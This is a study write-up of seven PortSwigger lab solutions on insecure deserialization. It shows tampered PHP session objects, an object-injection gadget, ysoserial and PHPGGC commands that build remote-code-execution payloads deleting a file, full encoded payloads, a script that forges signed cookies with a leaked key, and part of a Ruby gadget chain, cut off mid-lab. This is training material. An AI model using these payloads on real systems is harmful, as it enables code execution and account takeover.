---
created: 2026-05-18
---


| `#`  | Solved? | Name                                                                    | Date    | Notes |
| ---- | ------- | ----------------------------------------------------------------------- | ------- | ----- |
| `1.` | **`✓`** | Modifying serialized objects                                            | `21.06` |       |
| `2.` | `✓`     | Modifying serialized data types                                         | `21.06` |       |
| `3.` | `✓`     | Using application functionality to exploit insecure deserialization<br> | `18.05` |       |
| `4.` | `✓`     | Arbitrary object injection in PHP                                       | `21.06` |       |
| `5.` | `✓`     | Exploiting Java deserialization with Apache Commons                     | `21.06` |       |
| `6.` | `✓`     | Exploiting PHP deserialization with a pre-built gadget chain            | `22.06` |       |
| `7.` | `✓`     | Exploiting Ruby deserialization using a documented gadget chain         | `23.06` |       |

## 1. Modifying serialized objects

>[!done]

>[!note]+ Lab description
> - [`Lab: Modifying serialized objects`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
> - Level: #Apprentice 
> 
> This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. In HTTP history, notice the application assigns a session cookie as soon as you log in. Select it and see it is a Base64-encoded URL-encoded PHP-serialized object:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/1.png]]

- Inside that object, there is the `admin` property. This is a Boolean value set to `false`. 

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

- Visit `/admin` and see access is blocked (`401 Unauthorized`):

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/2.png]]

- Send this request to `Repeater`. Select the session cookie value again and change `admin` from `0` to `1`:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

- Send the request and observe you can access the admin panel:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/3.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/4.png]]


- Delete the user `carlos` by sending a `GET` to `/admin/delete?username=carlos` with the modified cookie value:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/5.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab1/solved.png]]

Solved!
## 2. Modifying serialized data types

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Modifying serialized data types`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
> - Level: #Practitioner 
> 
> This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and inspect the session cookie the application assigns:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"tx36eo8vsql2b48q0oszsfiu722nd4zl";}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab2/1.png]]

- Go to `/admin` and see access is restricted. Send this request to `Repeater`. 
- Attempt to access `/admin` by replacing the `username` attribute of the serialized object from `wiener` to `administrator`:

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"tx36eo8vsql2b48q0oszsfiu722nd4zl";}
```

- Send the request and observe the response:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab2/2.png]]

- You get `401 Unauthorized` again, but this time an error occurs:

```php
PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, $user-&gt;access_token = tx36eo8vsql2b48q0oszsfiu722nd4zl, $access_tokens = [xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx]) Invalid access token for user administrator in /var/www/index.php:8
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 8
```

- The application checks the access token for the user and throws an error if it's invalid. 
- Since you can't retrieve the token itself (the tokens array in the stack trace are masked), attempt to bypass the check by injecting an integer `0` as the token value:

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

- This exploits one of the PHP comparison quirks in the older versions.
- Send the request and see you've got access to the admin panel:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab2/3.png]]

- Delete the user `carlos` by sending a `GET` to `/admin/delete?username=carlos`.

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab2/4.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab2/solved.png]]

Solved!


## 3. Using application functionality to exploit insecure deserialization

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Using application functionality to exploit insecure deserialization`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
> - Level: #Practitioner 
> 
> This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 
> You also have access to a backup account: `gregg:rosebud`


### Solution

- Log in as `gregg` and inspect the session cookie:

```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"g43vgyfjx4srzrhup0ugk96wed6pg9uk";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab3/1.png]]


- Notice the avatar link is encoded in the session cookie. 
- Delete the account and inspect the request.

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab3/2.png]]

- Send this request to `Repeater`.
- Log in as `wiener`. Copy their session cookie and paste to the request in the repeater. Then modify the `avatar_link` parameter to `/home/carlos/morale.txt`:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zl0dptc7tx5zx3mdkgdkpc0ufrcbuexf";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab3/3.png]]

- `Send` the request. The application responds with `200 OK`.

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab3/4.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab3/solved.png]]

Solved!
## 4. Arbitrary object injection in PHP


>[!note]+ Lab description
> 
> - [`Lab: Arbitrary object injection in PHP`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
> - Level: #Practitioner 
> 
> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and inspect the session cookie.

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t3b5419yzm5zy538wu0aefsb5ea18p6u";}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/1.png]]

- This is a PHP-serialized object. 
- This time, the goal is not to just access the admin panel and delete `carlos`, but inject an object and trigger code execution. 

- Go to `Target` -> `Site map` and see `CustomTemplate.php`:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/2.png]]

- The response is empty, meaning the code is executed rather than sent in response. Send this request to `Repeater` and append a tilde `~` to the filename to attempt retrieve the file source:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/3.png]]

- See the source code is returned. Inspect it:

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

- This code defines the `CustomTemplate` object.
- Observe that Carlos overwrote the default `__destruct()` magic method for this object.
- `__destruct()` runs automatically when the object is destroyed. It removes the lock file:

```php
unlink("template.html.lock");
```

- Modify your session cookie in `Repeater`. Change `User` class to `CustomTemplate`:

```php
O:14:"CustomTemplate":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t3b5419yzm5zy538wu0aefsb5ea18p6u";}
```

```bash
echo -n "CustomTemplate" | wc -m
# 14
```

- Then replace all attributes with just one: `lock_file_path` set to `/home/carlos/morale.txt`:

```php
O:14:"CustomTemplate":2:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```bash
echo -n "lock_file_path" | wc -m
# 14
```

```bash
echo -n "/home/carlos/morale.txt" | wc -m
# 23
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/4.png]]

- Then send the request.
- You get `500 Internal Server Error` with a serialization error:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/5.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab4/solved.png]]

Solved!
## 5. Exploiting Java deserialization with Apache Commons

>[!done]
 
>[!note]+ Lab description
> 
> 
> - [`Lab: Exploiting Java deserialization with Apache Commons`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
> - Level: #Practitioner 
> 
> This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
> 
> To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 

### Solution

- Install [`ysoserial`](https://github.com/frohoff/ysoserial) jar file first.
- Log in as `wiener` and inspect your session cookie.

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab5/1.png]]

- It's a URL-encoded Base64-encoded value. But this time, it decodes to a non-human-readable sequence of bytes. 


- Try Java deserialization:

```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt"
```

```bash
java \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0 > cookie.txt
```

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIxMTI0MDczMDc4ODM0AQAeTHlzb3NlcmlhbC9Qd25lcjExMjQwNzMwNzg4MzQ7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFxAH4AKXg=
```

- Use a URL-encoded version of this value as a session cookie:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab5/2.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab5/solved.png]]

Solved!
## 6. Exploiting PHP deserialization with a pre-built gadget chain

>[!note]+ Lab description
> 
> - [`Lab: Exploiting PHP deserialization with a pre-built gadget chain`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
> - Level: #Practitioner 
> 
> This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.
> 
> To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Install [`PHPGGC`](https://github.com/ambionics/phpggc).
- Log in as `wiener` and inspect the session cookie. 

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNncwOTN4ajh6aGl3dDAwZDZxNTJxYjJvNWZpdG1kcSI7fQ==","sig_hmac_sha1":"8623d475b446671f892f6f2d24db38ff2266f33c"}
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/1.png]]

- This is a JSON structure. Decode the `token` value:

```bash
echo -n "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoNnl0ZDNoN2FsZXBtYzJyem40Z2QxZ3lmbWlqdmRwdyI7fQ==" | base64 -d
```

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"h6ytd3h7alepmc2rzn4gd1gyfmijvdpw";}
```

- This is a PHP serialized object. 
- Notice the token is signed. Send a request to `Repeater` and modify the serialized object by changing `wiener` to `administrator`:

```bash
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"h6ytd3h7alepmc2rzn4gd1gyfmijvdpw";}' | base64
```

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Img2eXRkM2g3YWxlcG1jMnJ6bjRnZDFneWZtaWp2ZHB3Ijt9
```

- Then replace the original `token` value to the one you've got. Send the request.

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/2.png]]

- You get `500 Internal Server Error` with the message:

```
Internal Server Error: Symfony Version: 4.3.6

PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7
```

- This reveals the underlying framework — PHP Symfony. 
- Inspect the source of the main page and notice a comment:

```html
                   <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/3.png]]

- Navigate to this endpoint (use initial cookie value) and see a PHP info page:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/4.png]]

- Notice the page reveals `SECRET_KEY`:

```
arthpjuo8mu06uplmsb4jd6y7spfvvhd
```

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/5.png]]

- This key is needed to sign the token. 
- Use PHPGGC to find and create a payload:

```bash
./phpggc --list 
```

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```


![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/6.png]]

- Copy the Base64-encoded version:

```
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

- To construct the cookie:

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

- In this case:

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "arthpjuo8mu06uplmsb4jd6y7spfvvhd";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

- Output:

```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2240fab714b4f90c6574c3a41266b361d07b8fd737%22%7D
```

- Use the output as a cookie:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/7.png]]



- You should see an error other than one about PHP signature mismatch:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/8.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab6/solved.png]]

Solved!
## 7. Exploiting Ruby deserialization using a documented gadget chain


>[!note]+ Lab description
> 
> - [`Lab: Exploiting Ruby deserialization using a documented gadget chain`](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
> - Level: #Practitioner 
> 
> This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
> 
> To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: wiener:peter


### Solution

 - Log in as `wiener` and inspect the session cookie:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab7/1.png]]

- Find a [`Universal RCE deserialization gadget chain for Ruby`](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) online:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

